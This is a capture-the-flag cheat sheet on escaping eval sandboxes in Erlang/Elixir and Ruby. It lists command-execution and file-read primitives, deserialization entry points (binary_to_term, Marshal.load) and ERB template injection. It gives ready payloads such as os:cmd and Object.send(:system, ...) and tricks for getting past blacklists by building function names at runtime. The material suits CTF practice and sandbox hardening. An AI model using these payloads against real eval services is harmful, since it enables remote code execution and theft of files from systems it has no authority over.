# Sandbox escape — Erlang & Ruby eval

## Erlang / Elixir
Server evaluates attacker Erlang/Elixir (`erl_eval`, `:erlang` eval endpoints, LiveBook-style).
Dangerous primitives:
- **`os:cmd("id")`** (Erlang) / **`System.cmd("sh", ["-c","id"])`, `:os.cmd('id')`** (Elixir) — RCE.
- **`erlang:open_port({spawn, "id"}, [])`** — spawn a port program → command exec even if `os:cmd` is blocked.
- **`file:read_file("/flag")`** / **`File.read!("/flag")`** — direct file read.
- **`code:load_binary`, `erlang:binary_to_term(bin, [])`** — `binary_to_term` on attacker bytes is a deserialization RCE (crafted term invoking a fun/module); never safe on untrusted input.
- **`erlang:apply(M,F,A)`**, `:erlang.apply` — dynamic dispatch to bypass name blacklists.
Escapes: reconstruct blocked module/function atoms dynamically (`list_to_atom("os")`, `erlang:apply(list_to_atom("os"),cmd,["id"])`), or use `open_port` when `os:cmd` is filtered. `binary_to_term` endpoints → send a term that triggers code execution on decode.

```erlang
os:cmd("cat /flag").
erlang:open_port({spawn,"cat /flag"},[]).
erlang:apply(list_to_atom("os"),list_to_atom("cmd"),["id"]).
```

## Ruby eval
Server runs attacker Ruby (`eval`, `instance_eval`, `Object.send`, ERB templates, `Marshal.load`).
Dangerous primitives:
- **`` `id` ``, `system("id")`, `exec`, `%x{id}`, `IO.popen("id").read`, `Open3.capture2`** — RCE.
- **`File.read("/flag")`, `Dir`, `Kernel.open("|id")`** (pipe open) — read / exec.
- **`send`/`public_send`/`__send__`** — call blocked methods by name string (bypass blacklists): `Object.send(:system, "id")`.
- **`ObjectSpace.each_object`** — walk all live objects to find a class/binding that re-enables what was stripped.
- **`Marshal.load`** on untrusted bytes — deserialization RCE (gadget chains).
- **`method_missing`, `const_get`, `Kernel.const_get(:File)`** — resolve blocked constants dynamically.
Escapes: build method/const names as symbols/strings (`"sys"+"tem"`), use `send`, `const_get`, backticks vs `system` vs `%x` interchangeably to dodge string filters; ERB SSTI → `<%= system('id') %>`.

```ruby
Object.send(:system, "cat /flag")
Kernel.const_get(:File).read("/flag")
eval("sys"+"tem('id')")
```

Recognition: an endpoint that "runs your <lang>" with a blacklist, an ERB/template render, or a `binary_to_term`/`Marshal.load` on input. **All blacklists on these languages are bypassable by dynamic name construction + `apply`/`send`/`const_get`.** Prefer a direct file read of the flag over full RCE when possible.
